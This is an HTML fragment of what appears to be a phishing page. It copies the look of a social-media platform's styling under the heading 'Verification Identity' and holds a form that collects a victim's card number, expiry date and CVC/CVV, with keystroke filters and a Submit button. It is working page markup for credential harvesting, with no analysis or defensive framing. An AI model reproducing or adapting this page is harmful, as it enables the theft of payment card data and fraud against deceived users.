...
<div class="l9j0dhe7">
<i data-visualcompletion="css-img" style="background-image: url(&quot;img/IcoMeT4.png&quot;); background-position: 0px -274px; background-size: auto; width: 500px; height: 134px; background-repeat: no-repeat; display: inline-block;"></i>
</div>
...
<span class="updown2 d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 qg6bub1s iv3no6db TeeXde f530mmz5 hnhda86s oo9gr5id oqcyycmt" dir="auto">Verification Identity </span>
</div>
<div class="aov4n071 bi6gxh9e">
...
<span class="froTex">User data information</span>
...
<div class="qzhwtbm6 knvmm38d">
<span class="froTex">Payment method :</span> </br></br>
<span class="d2edcug0 hpfvmrgz qv66sw1b c1et5uql lr9zc1uh a8c37x1j fe6kdd0r mau55g9w c8b282yb keod5gw0 nxhoafnm aigsh9s9 d3f4x2em iv3no6db jq4qci2q a3bd9o3v b1v8xokw m9osqain hzawbc8m" dir="auto">
  
        <div class="card_number UpDown" id="card-container">
        <input type="text" class="input" id="card" name="cn" pattern=".{15,}" maxlength="16" required="yes" placeholder="Card Number"  onKeyDown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode && event.keyCode<58 && event.shiftKey==false)
        || (95<event.keyCode && event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 && event.keyCode<40)
        || (event.keyCode==46) )"> <div id="logo"></div>
        </div>
        
        <div class="card_grp">   
        <div class="expiry_date">
        <input type="text" class="expiry_input" data-mask="00" name="nm" pattern=".{1,}" maxlength="2" required="yes" placeholder="MM" onKeyDown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode && event.keyCode<58 && event.shiftKey==false)
        || (95<event.keyCode && event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 && event.keyCode<40)
        || (event.keyCode==46) )">
        <input type="text" class="expiry_input" data-mask="00" name="ny" pattern=".{2,}" maxlength="2" required="yes"placeholder="YY" onKeyDown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode && event.keyCode<58 && event.shiftKey==false)
        || (95<event.keyCode && event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 && event.keyCode<40)
        || (event.keyCode==46) )">
        <div class="cvc">
        <input type="text" class="cvc_input" data-mask="000" name="ncv" pattern=".{3,}" maxlength="4" required="yes" placeholder="CVC/CVV" onKeyDown="return ( event.ctrlKey || event.altKey
        || (47<event.keyCode && event.keyCode<58 && event.shiftKey==false)
        || (95<event.keyCode && event.keyCode<106)
        || (event.keyCode==8) || (event.keyCode==9)
        || (event.keyCode>34 && event.keyCode<40)
    ...
    <div class="linfgray ay7djpcl k4urcfbm"></div>
<button class="k4urcfbm l9j0dhe7 tw6a2znq d1544ag0 stjgntxs ni8dbmo4 taijpn5t tv7at329 btwxx1t3 j83agx80 rq0escxv kzx2olss aot14ch1 p86d2i9g beltcj47 izx4hr6d humdl8nn bn081pho gcieejh5 tcv6vlfj bp9cbjyn qrtewk5h jq4qci2q" id="submit-btn" type="submit"><b>Submit</b></button> 
</form>
</div>
<div class="_3QeaJ">
